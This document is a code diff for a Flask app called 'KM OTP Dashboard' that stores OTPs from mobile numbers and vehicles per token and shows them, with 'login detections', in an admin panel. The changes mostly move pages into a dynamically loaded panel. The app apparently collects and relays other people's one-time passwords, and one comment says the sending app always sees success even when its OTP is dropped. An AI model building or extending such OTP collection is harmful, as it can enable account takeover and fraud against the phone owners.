@@ -23,11 +23,11 @@ token_mobile_caps = {t: None for t in PREDEFINED_TOKENS}
 token_processed_mobiles = {t: set() for t in PREDEFINED_TOKENS}
 
 # =========================
-# Storage per token
+# Storage per token (in-memory)
 # =========================
-mobile_otps = {t: [] for t in PREDEFINED_TOKENS}
-vehicle_otps = {t: [] for t in PREDEFINED_TOKENS}
-otp_data = {t: [] for t in PREDEFINED_TOKENS}      # all delivered/removed OTPs with reasons
+mobile_otps = {t: [] for t in PREDEFINED_TOKENS}      # pending mobile OTPs (not yet delivered)
+vehicle_otps = {t: [] for t in PREDEFINED_TOKENS}     # pending vehicle OTPs
+otp_data = {t: [] for t in PREDEFINED_TOKENS}         # all delivered/removed OTPs with reasons
 client_sessions = {t: {} for t in PREDEFINED_TOKENS}
 browser_queues = {t: {} for t in PREDEFINED_TOKENS}
 login_sessions = {t: {} for t in PREDEFINED_TOKENS}
@@ -99,7 +99,7 @@ def cleanup_stale_browsers_and_handle_pending(token, identifier):
                     try: mobile_otps[token].remove(p)
                     except ValueError: pass
                     mark_otp_removed_to_data(token, p, reason="stale_browser", browser_id=b)
-            # Move vehicle OTPs
+            # Move vehicle OTPs that arrived after first_request
             for p in list(vehicle_otps[token]):
                 if (p.get("vehicle") or "").upper() == identifier.upper() and p.get("timestamp") and p["timestamp"] > first_req_dt:
                     try: vehicle_otps[token].remove(p)
@@ -137,7 +137,7 @@ def receive_otp():
                         "removed_reason": "limit_exceeded"
                     }
                     otp_data[token].append(entry)
-                    # App always sees success
+                    # App always sees success (per your request)
                     return jsonify({"status": "success", "message": "OTP stored"}), 200
                 token_processed_mobiles[token].add(sim_number)
 
@@ -260,7 +260,7 @@ def login_found():
         return jsonify({"status": "not_found", "mobile_number": mobile_number}), 200
 
 # =========================
-# Admin Login + Dashboard
+# Admin Login + Dashboard (dynamic content loading)
 # =========================
 admin_login_page = """
 <html><head><title>Admin Login</title></head>
@@ -336,13 +336,14 @@ def admin_dashboard():
         for t in PREDEFINED_TOKENS
     )
 
+    # Links will call loadContent(url) to fetch into dynamic panel (no new tab)
     token_list_html = "".join(
-        f"<li style='margin:8px 0;'><a href='/status/{t}' target='_blank' style='color:#2980B9;text-decoration:none;font-weight:700;'>{t}</a></li>"
+        f"<li style='margin:8px 0;'><a href='#' onclick=\"loadContent('/status/{t}?embed=1')\" style='color:#2980B9;text-decoration:none;font-weight:700;'>{t}</a></li>"
         for t in PREDEFINED_TOKENS
     )
 
     limit_token_list_html = "".join(
-        f"<li style='margin:8px 0;'><a href='/admin-limit/{t}' target='_blank' style='color:#2980B9;text-decoration:none;font-weight:700;'>{t}</a></li>"
+        f"<li style='margin:8px 0;'><a href='#' onclick=\"loadContent('/admin-limit/{t}?embed=1')\" style='color:#2980B9;text-decoration:none;font-weight:700;'>{t}</a></li>"
         for t in PREDEFINED_TOKENS
     )
 
@@ -364,12 +365,12 @@ def admin_dashboard():
                 font-size:14px; font-weight:600;
             }}
             .sidebar a.buttonlink {{ text-decoration:none; }}
-            .content {{ flex-grow:1; padding:28px; }}
+            .content {{ flex-grow:1; padding:20px; }}
             h3 {{ margin-top:0; color:#2C3E50; }}
             table {{ border-collapse: collapse; width:100%; background:white; box-shadow:0px 4px 18px rgba(0,0,0,0.06); border-radius:8px; overflow:hidden; }}
             th, td {{ border-bottom:1px solid #eee; padding:12px 10px; text-align:center; }}
             th {{ background:#2980B9; color:white; font-weight:700; }}
-            .card {{ background:white; padding:16px; border-radius:8px; box-shadow:0px 2px 6px rgba(0,0,0,0.04); }}
+            .card {{ background:white; padding:16px; border-radius:8px; box-shadow:0px 2px 6px rgba(0,0,0,0.04); margin-bottom:20px; }}
             ul.token-list {{ list-style:none; padding:0; margin:10px 0; }}
             .message {{ text-align:center; margin-bottom:14px; color:green; font-weight:600; }}
             label {{ display:block; margin-top:8px; color:#333; font-weight:600; font-size:13px; }}
@@ -382,6 +383,21 @@ def admin_dashboard():
                     if(el) el.style.display = 'none';
                 }});
                 if(id) document.getElementById(id).style.display = 'block';
+            }}
+            function loadContent(url) {{
+                var dyn = document.getElementById('dynamic_content');
+                dyn.innerHTML = "<div style='padding:20px;'>Loading...</div>";
+                fetch(url, {{credentials: 'same-origin'}})
+                  .then(function(res) {{
+                      if(!res.ok) throw new Error('HTTP '+res.status);
+                      return res.text();
+                  }})
+                  .then(function(html) {{
+                      dyn.innerHTML = html;
+                  }})
+                  .catch(function(err) {{
+                      dyn.innerHTML = "<div style='color:red;padding:20px;'>Failed to load content: "+err.message+"</div>";
+                  }});
             }}
             window.onload = function() {{ showSection('tokens_section'); }};
         </script>
@@ -396,12 +412,14 @@ def admin_dashboard():
                 <button onclick="showSection('changepass_section')">CHANGE PASSWORD</button>
                 <a href="/admin-logout" class="buttonlink"><button style="background:#E74C3C;margin-top:14px;">LOGOUT</button></a>
             </div>
+
             <div class="content">
                 <div class="message">{msg}</div>
+
                 <div id="tokens_section" class="card" style="display:none;">
                     <h3>Available Tokens</h3>
                     <ul class="token-list">{token_list_html}</ul>
-                    <p style="color:#666">Click a token to open its dashboard in a new tab.</p>
+                    <p style="color:#666">Click a token to load its dashboard below (same tab).</p>
                 </div>
 
                 <div id="tokencap_section" class="card" style="display:none;">
@@ -415,7 +433,7 @@ def admin_dashboard():
                 <div id="limit_section" class="card" style="display:none;">
                     <h3>Limit Exceeded</h3>
                     <ul class="token-list">{limit_token_list_html}</ul>
-                    <p style="color:#666">Click a token to open the limit-exceeded list in a new tab.</p>
+                    <p style="color:#666">Click a token to view its limit-exceeded OTPs below.</p>
                 </div>
 
                 <div id="changepass_section" class="card" style="display:none;">
@@ -432,6 +450,11 @@ def admin_dashboard():
                         </div>
                     </form>
                 </div>
+
+                <!-- Dynamic content panel: token dashboard / admin-limit pages will load here -->
+                <div id="dynamic_content" class="card">
+                    <p style="color:#666">Select a token or a section from the left to load content here.</p>
+                </div>
             </div>
         </div>
     </body>
@@ -440,7 +463,7 @@ def admin_dashboard():
     return html
 
 # =========================
-# Admin - limit-exceeded per token (with delete)
+# Admin - limit-exceeded per token (supports embed=1)
 # =========================
 @app.route('/admin-limit/<token>', methods=['GET','POST'])
 def admin_limit(token):
@@ -476,42 +499,65 @@ def admin_limit(token):
             </tr>
             """
 
-    html = f"""
-    <html>
-    <head>
-        <title>Limit Exceeded - {token}</title>
-        <style>
-            body {{ font-family: 'Segoe UI', Arial, sans-serif; background:#f9f9f9; margin:0; padding:20px; }}
-            h2 {{ text-align:center; color:#2C3E50; }}
-            form {{ max-width:1100px; margin:20px auto; }}
-            table {{ border-collapse: collapse; width:100%; background:white; box-shadow:0px 6px 20px rgba(0,0,0,0.06); border-radius:8px; overflow:hidden; }}
-            th, td {{ padding:12px 10px; text-align:center; border-bottom:1px solid #eee; }}
-            th {{ background:#E74C3C; color:white; font-weight:700; }}
-            button {{ margin:10px 6px; padding:10px 16px; background:#E74C3C; color:white; border:none; border-radius:6px; cursor:pointer; font-weight:700; }}
-            button[name="delete_all"] {{ background:#C0392B; }}
-        </style>
-    </head>
-    <body>
-        <h2>Limit Exceeded OTPs - {token}</h2>
-        <form method="POST">
-            <table>
+    # If embed param present -> return partial HTML (no <html><head>) so it can be safely injected
+    if request.args.get('embed') == '1':
+        partial = f"""
+        <h3>Limit Exceeded - {token}</h3>
+        <form method="POST" id="limit_form">
+            <table style="width:100%;border-collapse:collapse;">
                 <tr>
-                    <th>Select</th><th>MOBILE</th><th>VEHICLE</th><th>OTP</th><th>BROWSER ID</th><th>DATE</th><th>Reason</th>
+                    <th style="background:#E74C3C;color:white;padding:8px;">Select</th>
+                    <th style="background:#E74C3C;color:white;padding:8px;">MOBILE</th>
+                    <th style="background:#E74C3C;color:white;padding:8px;">VEHICLE</th>
+                    <th style="background:#E74C3C;color:white;padding:8px;">OTP</th>
+                    <th style="background:#E74C3C;color:white;padding:8px;">BROWSER ID</th>
+                    <th style="background:#E74C3C;color:white;padding:8px;">DATE</th>
+                    <th style="background:#E74C3C;color:white;padding:8px;">Reason</th>
                 </tr>
-                {rows if rows else '<tr><td colspan="7">No limit-exceeded OTPs found</td></tr>'}
+                {rows if rows else '<tr><td colspan="7" style="padding:12px;">No limit-exceeded OTPs found</td></tr>'}
             </table>
-            <div style="text-align:center; margin-top:12px;">
-                <button type="submit" name="delete_selected">Delete Selected</button>
-                <button type="submit" name="delete_all">Delete All</button>
+            <div style="margin-top:12px;">
+                <button type="submit" name="delete_selected" style="background:#E74C3C;color:white;padding:8px 12px;border:none;border-radius:6px;">Delete Selected</button>
+                <button type="submit" name="delete_all" style="background:#C0392B;color:white;padding:8px 12px;border:none;border-radius:6px;">Delete All</button>
             </div>
         </form>
-    </body>
-    </html>
+        """
+        return partial
+
+    # full page if accessed directly
+    html = f"""
+    <html><head><title>Limit Exceeded - {token}</title></head>
+    <body style="font-family:Segoe UI, Arial, sans-serif;background:#f9f9f9;padding:20px;">
+        <div style="max-width:1100px;margin:0 auto;background:white;padding:16px;border-radius:8px;box-shadow:0 4px 18px rgba(0,0,0,0.06);">
+            <h2>Limit Exceeded OTPs - {token}</h2>
+            <form method="POST">
+                <table style="width:100%;border-collapse:collapse;">
+                    <tr>
+                        <th style="background:#E74C3C;color:white;padding:8px;">Select</th>
+                        <th style="background:#E74C3C;color:white;padding:8px;">MOBILE</th>
+                        <th style="background:#E74C3C;color:white;padding:8px;">VEHICLE</th>
+                        <th style="background:#E74C3C;color:white;padding:8px;">OTP</th>
+                        <th style="background:#E74C3C;color:white;padding:8px;">BROWSER ID</th>
+                        <th style="background:#E74C3C;color:white;padding:8px;">DATE</th>
+                        <th style="background:#E74C3C;color:white;padding:8px;">Reason</th>
+                    </tr>
+                    {rows if rows else '<tr><td colspan="7" style="padding:12px;">No limit-exceeded OTPs found</td></tr>'}
+                </table>
+                <div style="margin-top:12px;">
+                    <button type="submit" name="delete_selected" style="background:#E74C3C;color:white;padding:8px 12px;border:none;border-radius:6px;">Delete Selected</button>
+                    <button type="submit" name="delete_all" style="background:#C0392B;color:white;padding:8px 12px;border:none;border-radius:6px;">Delete All</button>
+                </div>
+            </form>
+            <div style="margin-top:12px;"><a href="/admin">Back to Admin</a></div>
+        </div>
+    </body></html>
     """
     return html
 
 # =========================
 # Token login/dashboard
+# - Supports embed=1 (partial HTML) for admin dynamic injection.
+# - Admin can access token dashboard directly without token session.
 # =========================
 login_page_html = """
 <html><head><title>Login</title></head>
@@ -550,6 +596,7 @@ def logout():
 
 @app.route('/change-password/<token>', methods=['POST'])
 def change_password(token):
+    # Only token owner may change their password via token dashboard (not admin)
     if "token" not in session or session["token"] != token:
         return redirect(url_for("login"))
     cur = request.form.get("current_password")
@@ -564,11 +611,11 @@ def change_password(token):
 
 @app.route('/status/<token>', methods=['GET','POST'])
 def status(token):
-    # ✅ Allow admin direct access OR token-login access
+    # allow admin direct access OR token-login access
     if not (("token" in session and session["token"] == token) or session.get("is_admin")):
         return redirect(url_for("login"))
 
-    # OTP table (all otp_data entries for this token)
+    # Build OTP rows (show otp_data entries for this token)
     otp_rows = ""
     for i, e in enumerate(otp_data[token]):
         ts = e.get("timestamp", e.get("removed_at", datetime.now(IST))).strftime("%Y-%m-%d %H:%M:%S")
@@ -584,7 +631,7 @@ def status(token):
         </tr>
         """
 
-    # Login table
+    # Login rows
     login_rows = ""
     for m, entries in login_sessions[token].items():
         for i, e in enumerate(entries):
@@ -597,6 +644,7 @@ def status(token):
             </tr>
             """
 
+    # Handle POST actions (deletes) when viewed standalone (not embedded)
     if request.method == 'POST':
         if "delete_selected_otps" in request.form:
             to_delete = [int(x) for x in request.form.getlist("otp_rows")]
@@ -619,93 +667,130 @@ def status(token):
             login_sessions[token].clear()
             return redirect(url_for("status", token=token))
 
+    # Partial (embed) HTML for admin dynamic injection
+    if request.args.get('embed') == '1':
+        partial = f"""
+        <div>
+            <h3>Token Dashboard - {token}</h3>
+            <div style="margin-bottom:12px;"><strong>Processed mobiles:</strong> {len(token_processed_mobiles[token])} &nbsp; <strong>Cap:</strong> {token_mobile_caps[token] if token_mobile_caps[token] else 'Unlimited'}</div>
+
+            <h4>OTP Data</h4>
+            <form method="POST" id="otp_form">
+                <table style="width:100%;border-collapse:collapse;">
+                    <tr>
+                        <th style="background:#2980B9;color:white;padding:8px;">Select</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">MOBILE</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">VEHICLE</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">OTP</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">BROWSER ID</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">DATE</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">Reason</th>
+                    </tr>
+                    {otp_rows if otp_rows else '<tr><td colspan="7" style="padding:12px;">No OTPs found</td></tr>'}
+                </table>
+                <div style="margin-top:10px;">
+                    <button type="submit" name="delete_selected_otps" style="background:#E74C3C;color:white;padding:8px 12px;border:none;border-radius:6px;">Delete Selected</button>
+                    <button type="submit" name="delete_all_otps" style="background:#C0392B;color:white;padding:8px 12px;border:none;border-radius:6px;">Delete All</button>
+                </div>
+            </form>
+
+            <h4 style="margin-top:18px;">Login Detections</h4>
+            <form method="POST" id="login_form">
+                <table style="width:100%;border-collapse:collapse;">
+                    <tr>
+                        <th style="background:#2980B9;color:white;padding:8px;">Select</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">MOBILE</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">DATE</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">SOURCE</th>
+                    </tr>
+                    {login_rows if login_rows else '<tr><td colspan="4" style="padding:12px;">No login detections</td></tr>'}
+                </table>
+                <div style="margin-top:10px;">
+                    <button type="submit" name="delete_selected_logins" style="background:#E74C3C;color:white;padding:8px 12px;border:none;border-radius:6px;">Delete Selected</button>
+                    <button type="submit" name="delete_all_logins" style="background:#C0392B;color:white;padding:8px 12px;border:none;border-radius:6px;">Delete All</button>
+                </div>
+            </form>
+
+            <div style="margin-top:18px;">
+                <h4>Change Password (token owner only)</h4>
+                <form method="POST" action="/change-password/{token}">
+                    <label>Current Password</label>
+                    <input type="password" name="current_password" required style="padding:6px;margin:6px 0;width:100%;border-radius:6px;border:1px solid #ddd;">
+                    <label>New Password</label>
+                    <input type="password" name="new_password" required style="padding:6px;margin:6px 0;width:100%;border-radius:6px;border:1px solid #ddd;">
+                    <label>Confirm Password</label>
+                    <input type="password" name="confirm_password" required style="padding:6px;margin:6px 0;width:100%;border-radius:6px;border:1px solid #ddd;">
+                    <div style="margin-top:10px;">
+                        <button type="submit" style="background:#27AE60;color:white;padding:8px 12px;border:none;border-radius:6px;">Change Password</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+        """
+        return partial
+
+    # Full standalone page (if user visits /status/<token> directly)
     html = f"""
     <html>
-    <head>
-        <title>{token} Dashboard</title>
-        <style>
-            body {{ font-family: 'Segoe UI', Arial, sans-serif; background:#f9f9f9; margin:0; }}
-            h2 {{ margin:20px 0; text-align:center; color:#2C3E50; }}
-            .container {{ display:flex; min-height:100vh; }}
-            .sidebar {{ width:220px; background:#2C3E50; padding:20px; color:white; }}
-            .sidebar button {{ margin-bottom:15px; width:100%; padding:10px; border:none; background:#3498DB; color:white; cursor:pointer; border-radius:6px; font-weight:700; }}
-            .content {{ flex-grow:1; padding:30px; }}
-            table {{ border-collapse: collapse; width:100%; background:white; box-shadow:0px 4px 14px rgba(0,0,0,0.06); border-radius:8px; overflow:hidden; }}
-            th, td {{ border-bottom:1px solid #eee; padding:10px; text-align:center; }}
-            th {{ background:#2980B9; color:white; font-weight:700; }}
-            label {{ display:block; margin-top:6px; font-weight:700; color:#333; }}
-            input[type=password] {{ padding:8px; margin-top:6px; width:100%; box-sizing:border-box; border-radius:6px; border:1px solid #ddd; }}
-            button.action {{ padding:8px 12px; border-radius:6px; border:none; cursor:pointer; font-weight:700; }}
-        </style>
-        <script>
-            function showSection(id){{
-                document.getElementById('otp_section').style.display = id=='otp_section'?'block':'none';
-                document.getElementById('login_section').style.display = id=='login_section'?'block':'none';
-                document.getElementById('change_password').style.display = id=='change_password'?'block':'none';
-            }}
-            window.onload = function(){{ showSection('otp_section'); }};
-        </script>
-    </head>
-    <body>
-        <h2>KM OTP Dashboard ({token})</h2>
-        <div class="container">
-            <div class="sidebar">
-                <button onclick="showSection('otp_section')">OTP DATA</button>
-                <button onclick="showSection('login_section')">LOGIN DETECTIONS</button>
-                <button onclick="showSection('change_password')">CHANGE PASSWORD</button>
-                <a href="/logout" style="color:white;text-decoration:none;"><button style="width:100%;padding:10px;border:none;border-radius:6px;background:#E74C3C;font-weight:700;">LOGOUT</button></a>
+    <head><title>{token} Dashboard</title></head>
+    <body style="font-family:Segoe UI, Arial, sans-serif;background:#f9f9f9;padding:20px;">
+        <div style="max-width:1100px;margin:0 auto;background:white;padding:16px;border-radius:8px;box-shadow:0 4px 18px rgba(0,0,0,0.06);">
+            <h2>KM OTP Dashboard ({token})</h2>
+            <div style="margin-bottom:12px;"><strong>Processed mobiles:</strong> {len(token_processed_mobiles[token])} &nbsp; <strong>Cap:</strong> {token_mobile_caps[token] if token_mobile_caps[token] else 'Unlimited'}</div>
+
+            <form method="POST">
+                <h3>OTP Data</h3>
+                <table style="width:100%;border-collapse:collapse;">
+                    <tr>
+                        <th style="background:#2980B9;color:white;padding:8px;">Select</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">MOBILE</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">VEHICLE</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">OTP</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">BROWSER ID</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">DATE</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">Reason</th>
+                    </tr>
+                    {otp_rows if otp_rows else '<tr><td colspan="7" style="padding:12px;">No OTPs found</td></tr>'}
+                </table>
+                <div style="margin-top:10px;">
+                    <button type="submit" name="delete_selected_otps" style="background:#E74C3C;color:white;padding:8px 12px;border:none;border-radius:6px;">Delete Selected</button>
+                    <button type="submit" name="delete_all_otps" style="background:#C0392B;color:white;padding:8px 12px;border:none;border-radius:6px;">Delete All</button>
+                </div>
+            </form>
+
+            <form method="POST" style="margin-top:18px;">
+                <h3>Login Detections</h3>
+                <table style="width:100%;border-collapse:collapse;">
+                    <tr>
+                        <th style="background:#2980B9;color:white;padding:8px;">Select</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">MOBILE</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">DATE</th>
+                        <th style="background:#2980B9;color:white;padding:8px;">SOURCE</th>
+                    </tr>
+                    {login_rows if login_rows else '<tr><td colspan="4" style="padding:12px;">No login detections</td></tr>'}
+                </table>
+                <div style="margin-top:10px;">
+                    <button type="submit" name="delete_selected_logins" style="background:#E74C3C;color:white;padding:8px 12px;border:none;border-radius:6px;">Delete Selected</button>
+                    <button type="submit" name="delete_all_logins" style="background:#C0392B;color:white;padding:8px 12px;border:none;border-radius:6px;">Delete All</button>
+                </div>
+            </form>
+
+            <div style="margin-top:18px;">
+                <h3>Change Password (token owner only)</h3>
+                <form method="POST" action="/change-password/{token}">
+                    <label>Current Password</label>
+                    <input type="password" name="current_password" required style="padding:6px;margin:6px 0;width:100%;border-radius:6px;border:1px solid #ddd;">
+                    <label>New Password</label>
+                    <input type="password" name="new_password" required style="padding:6px;margin:6px 0;width:100%;border-radius:6px;border:1px solid #ddd;">
+                    <label>Confirm Password</label>
+                    <input type="password" name="confirm_password" required style="padding:6px;margin:6px 0;width:100%;border-radius:6px;border:1px solid #ddd;">
+                    <div style="margin-top:10px;">
+                        <button type="submit" style="background:#27AE60;color:white;padding:8px 12px;border:none;border-radius:6px;">Change Password</button>
+                    </div>
+                </form>
             </div>
-            <div class="content">
-                <div id="otp_section" style="display:none;">
-                    <div style="max-width:1100px;margin:0 auto;">
-                    <h3>OTP Data</h3>
-                    <form method="POST">
-                        <table>
-                            <tr><th>Select</th><th>MOBILE</th><th>VEHICLE</th><th>OTP</th><th>BROWSER ID</th><th>DATE</th><th>Reason</th></tr>
-                            {otp_rows if otp_rows else '<tr><td colspan="7">No OTPs found</td></tr>'}
-                        </table>
-                        <div style="margin-top:12px;">
-                            <button class="action" type="submit" name="delete_selected_otps" style="background:#E74C3C;color:white;">Delete Selected</button>
-                            <button class="action" type="submit" name="delete_all_otps" style="background:#C0392B;color:white;">Delete All</button>
-                        </div>
-                    </form>
-                    </div>
-                </div>
-                <div id="login_section" style="display:none;">
-                    <div style="max-width:1100px;margin:0 auto;">
-                    <h3>Login Detections</h3>
-                    <form method="POST">
-                        <table>
-                            <tr><th>Select</th><th>MOBILE</th><th>DATE</th><th>SOURCE</th></tr>
-                            {login_rows if login_rows else '<tr><td colspan="4">No login detections</td></tr>'}
-                        </table>
-                        <div style="margin-top:12px;">
-                            <button class="action" type="submit" name="delete_selected_logins" style="background:#E74C3C;color:white;">Delete Selected</button>
-                            <button class="action" type="submit" name="delete_all_logins" style="background:#C0392B;color:white;">Delete All</button>
-                        </div>
-                    </form>
-                    </div>
-                </div>
-                <div id="change_password" style="display:none;">
-                    <div style="max-width:600px;margin:0 auto;">
-                        <h3>Change Password</h3>
-                        <form method="POST" action="/change-password/{token}">
-                            <label>Current Password</label>
-                            <input type="password" name="current_password" required>
-                            <label>New Password</label>
-                            <input type="password" name="new_password" required>
-                            <label>Confirm Password</label>
-                            <input type="password" name="confirm_password" required>
-                            <div style="margin-top:12px;">
-                                <button class="action" type="submit" style="background:#27AE60;color:white;">Change Password</button>
-                            </div>
-                        </form>
-                        {"<p style='color:red;'>Current password incorrect.</p>" if request.args.get('err')=='wrong_current' else ""}
-                        {"<p style='color:red;'>New passwords do not match.</p>" if request.args.get('err')=='nomatch' else ""}
-                        {"<p style='color:green;'>Password changed successfully.</p>" if request.args.get('msg')=='changed' else ""}
-                    </div>
-                </div>
-            </div>
+
+            <div style="margin-top:16px;"><a href="/admin">Back to Admin</a> | <a href="/logout">Logout</a></div>
         </div>
     </body>
     </html>
